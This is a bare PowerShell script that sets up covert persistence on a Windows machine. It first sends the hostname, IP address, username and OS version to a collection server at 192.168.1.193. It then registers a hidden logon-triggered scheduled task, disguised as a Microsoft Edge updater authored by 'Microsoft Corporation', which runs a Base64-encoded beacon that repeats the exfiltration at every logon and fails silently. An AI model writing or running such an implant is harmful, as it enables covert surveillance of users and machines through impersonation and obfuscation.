# ---------------------------------------
# 1. Collect Info Now (One-Time Beacon)
# ---------------------------------------
$hostname = $env:COMPUTERNAME
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    $_.IPAddress -notlike "169.*" -and $_.PrefixOrigin -ne "WellKnown"
})[0].IPAddress

try {
    $payload = @{
        Hostname = $hostname
        IP       = $ip
        User     = $env:USERNAME
        OS       = (Get-CimInstance Win32_OperatingSystem).Caption
    }
    Invoke-WebRequest -Uri "http://192.168.1.193/collect" -Method POST -Body $payload -UseBasicParsing
} catch {
    # Fail silently
}

# ---------------------------------------
# 2. Define the logon Beacon Script
# ---------------------------------------
$beaconScript = @"
`$hostname = `$env:COMPUTERNAME
`$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    `$\_.IPAddress -notlike '169.*' -and `$\_.PrefixOrigin -ne 'WellKnown'
})[0].IPAddress
try {
    `$data = @{
        Hostname = `$hostname
        IP       = `$ip
        User     = `$env:USERNAME
        Time     = (Get-Date).ToString()
    }
    Invoke-WebRequest -Uri 'http://192.168.1.193/collect' -Method POST -Body `$data -UseBasicParsing
    Add-Content "`$env:TEMP\log.txt" "Beacon executed at: $(Get-Date)"
} catch {}
"@

# ---------------------------------------
# 3. Encode to Base64 for -EncodedCommand
# ---------------------------------------
$bytes = [System.Text.Encoding]::Unicode.GetBytes($beaconScript)
$encodedCommand = [Convert]::ToBase64String($bytes)

# ---------------------------------------
# 4. Create Scheduled Task (COM API)
# ---------------------------------------
$taskName = "MicrosoftEdgeUpdaterService"
$taskDescription = "Microsoft Edge Update Task (Telemetry)"

$service = New-Object -ComObject "Schedule.Service"
$service.Connect()

$rootFolder = $service.GetFolder("\")
$taskDef = $service.NewTask(0)

# Metadata
$taskDef.RegistrationInfo.Description = $taskDescription
$taskDef.RegistrationInfo.Author = "Microsoft Corporation"

# Trigger on user logon
$trigger = $taskDef.Triggers.Create(9)  # Logon Trigger
$trigger.UserId = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Action: run encoded PowerShell
$action = $taskDef.Actions.Create(0)
$action.Path = "powershell.exe"
$action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand `"$encodedCommand`""

# Settings
$taskDef.Settings.Enabled = $true
$taskDef.Settings.Hidden = $true
$taskDef.Settings.StartWhenAvailable = $true
$taskDef.Settings.DisallowStartIfOnBatteries = $false

# Register the task (overwrite if exists)
$rootFolder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 3, $null)

Write-Host "[+] Task '$taskName' registered. Will run at next logon."
